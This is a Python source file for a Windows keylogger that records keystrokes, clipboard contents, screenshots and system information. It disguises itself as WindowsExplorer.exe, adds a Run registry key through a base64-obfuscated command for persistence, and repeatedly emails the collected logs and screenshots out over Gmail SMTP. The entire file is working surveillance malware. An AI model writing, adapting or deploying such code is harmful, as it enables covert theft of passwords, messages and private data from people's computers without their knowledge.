import threading
import time
import smtplib
import socket
import subprocess
import os
import sys
import shutil
import win32clipboard
import pynput.keyboard as pk
import base64
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from PIL import ImageGrab
from collections import deque

# User defined module for Fetching Computer Info
from com_info import fetch_info


class KeyLogger:

    def __init__(self, interval, email, password):

        self.log = 'KeyLogger started...\n'

        self.interval = interval
        self.email = email
        self.password = password

        self.msg_to_be_sent_later = ''
        self.clipboard = ''

        self.screenshot_error = ''
        self.screenshot_list = deque()
        self.ss_enterKey_count = 0
        self.ss_deleteKey_count = 0

        self._FILE_PATH = os.environ['appdata']

        self._SS_INFO = ''
        self._KEYS_INFO = 'EXPLORER_LOG.txt' 
        self._SYSTEM_INFO = 'READ_ME.txt'
        self._SS_FOLDER_NAME = 'Windows_SS'
        self.PRINT_DEBUG_LOGS = False

        self.files_to_encrypt = [os.path.join(self._FILE_PATH, self._KEYS_INFO), os.path.join(self._FILE_PATH, self._SYSTEM_INFO)]

    def start(self, print_debug_logs=False):
        self.PRINT_DEBUG_LOGS = print_debug_logs
        if self.PRINT_DEBUG_LOGS:
            print('[+] Keylogger Started')
        self.become_persistent()
        key_listener = pk.Listener(on_press=self.process_key_press)
        with key_listener:
            self.report()
            key_listener.join()

    def become_persistent(self):
        try:
            if self.PRINT_DEBUG_LOGS:
                print('[+] Making the keylogger persistent')
            file_location = os.path.join(self._FILE_PATH, 'WindowsExplorer.exe')

            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                command = 'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"'
                command = base64.b64encode(command.encode()).decode()
                subprocess.call(base64.b64decode(command.encode()).decode(), shell=True)
                if self.PRINT_DEBUG_LOGS:
                    print('[+] Successfully made the keylogger persistent')
                    
        except Exception as e:
            if self.PRINT_DEBUG_LOGS:
                print(f'[-] Error while making persistent: {e}')
            pass

    def process_key_press(self, key):
        try:
            current_key = str(key.char)

        except AttributeError:
            if key == key.space:
                current_key = ' '
            elif key == key.enter:
                current_key = ' <'+str(key)+'> \n'
                if self.ss_enterKey_count < 10:
                    self.screenshot()
                    self.ss_enterKey_count += 1
            elif key == key.delete:
                current_key = ' <' + str(key) + '> '
                if self.ss_deleteKey_count < 5:
                    self.screenshot()
                    self.ss_deleteKey_count += 1
            else:
                current_key = ' <' + str(key) + '> '
        
        if self.PRINT_DEBUG_LOGS:
            print(f'[+] Logging key {current_key}')

        self.log += current_key

    def write_log(self, msg):
        if self.msg_to_be_sent_later == '':
            msg = msg + self.screenshot_error
        else:
            msg = self.msg_to_be_sent_later + '\n' + msg + \
                self.screenshot_error

        msg = '\n' + str(datetime.now()) + ':\n' + msg
        msg = base64.b64encode(msg.encode()).decode()

        path = os.path.join(self._FILE_PATH, self._KEYS_INFO)
        with open(path, 'w') as f:
            if self.PRINT_DEBUG_LOGS:
                print('[+] Writing keylogs to file')
            f.write(msg)
        self.log = ''

    def attach_file(self, msg, filename):
        if self.PRINT_DEBUG_LOGS:
            print(f'[+] Attaching file: {filename}')
        path = os.path.join(self._FILE_PATH, filename)
        if os.path.exists(path):
            with open(path, 'rb') as attachment:
                payload = attachment.read()
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(payload)
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(p)

    def copy_clipboard(self):
        if self.PRINT_DEBUG_LOGS:
            print('[+] Copying the content of clipboard')
        try:
            win32clipboard.OpenClipboard()
            self.clipboard = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        except:
            self.clipboard = '\nFailed to copy the contents of clipboard\n'
        self.log += ("\n\n\nClipboard Contents:\n" + self.clipboard + "\n\n")

    def screenshot(self):
        try:
            ss_folder_path = os.path.join(self._FILE_PATH, self._SS_FOLDER_NAME)
            if not os.path.exists(ss_folder_path):
                if self.PRINT_DEBUG_LOGS:
                    print(f'[+] Creating folder {ss_folder_path}')
                os.mkdir(ss_folder_path)
            self._SS_INFO = f"windows('{datetime.now()}').png"
            self._SS_INFO = self._SS_INFO.replace(':', '-')
            img = ImageGrab.grab()

            if self.PRINT_DEBUG_LOGS:
                print('[+] Taking screenshot')

            path = os.path.join(ss_folder_path, self._SS_INFO)
            img.save(path)
            self.screenshot_list.append(self._SS_INFO)
            self.screenshot_error = ''
        except Exception as e:
            if self.PRINT_DEBUG_LOGS:
                print(f'[-] Error while taking screenshot: {e}')
            self.screenshot_error = f"\nScreenshot Error! Failed to take the screenshot: {str(e)}\n"

    def computer_info(self):
        if self.PRINT_DEBUG_LOGS:
            print('[+] Retrieving system information')
        fetch_info(os.path.join(self._FILE_PATH, self._SYSTEM_INFO))

    def send_mail(self, email, password):
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = f'From {socket.gethostname()} @{datetime.now()}'

            self.attach_file(msg, self._KEYS_INFO)
            self.attach_file(msg, self._SYSTEM_INFO)

            while self.screenshot_list:
                screenshot = self.screenshot_list[0]
                path = os.path.join(self._SS_FOLDER_NAME, screenshot)
                self.attach_file(msg, path)
                self.screenshot_list.popleft()
            
            ss_folder_path = os.path.join(self._FILE_PATH, self._SS_FOLDER_NAME)
            if os.path.exists(ss_folder_path):
                try:
                    if self.PRINT_DEBUG_LOGS:
                        print(f'[-] Removing foler {ss_folder_path}')
                    shutil.rmtree(ss_folder_path)
                except Exception as e:
                    if self.PRINT_DEBUG_LOGS:
                        print(f'[-] Error removing folder {ss_folder_path}: {e}')
                    pass

            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(email, password)
            text = msg.as_string()

            if self.PRINT_DEBUG_LOGS:
                print(f'[+] Sending mail to {email}')

            s.sendmail(email, email, text)

            if self.PRINT_DEBUG_LOGS:
                print(f'[+] Successfully sent mail to {email}')

            s.quit()
            self.msg_to_be_sent_later = ''
            self.ss_enterKey_count = 0
            self.ss_deleteKey_count = 0

        except smtplib.SMTPException as e:
            if self.PRINT_DEBUG_LOGS:
                print(f'[-] Error sending mail: {e}')
            pass

        except socket.gaierror as e:
            if self.PRINT_DEBUG_LOGS:
                print(f'[-] Error sending mail: {e}')
            with open(os.path.join(self._FILE_PATH, self._KEYS_INFO), 'r') as f:
                data = f.read()

            self.msg_to_be_sent_later = '\n***\n' + base64.b64decode(data.encode()).decode()+'\n***\n'


    def report(self):
        if self.PRINT_DEBUG_LOGS:
            print('[+] Calling report function')
        self.copy_clipboard()
        self.screenshot()
        self.computer_info()
        self.write_log(self.log)
        self.send_mail(email=self.email, password=self.password)

        time.sleep(5)
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.start()

def test():
    print('Testing code')

if __name__ == '__main__':
    test()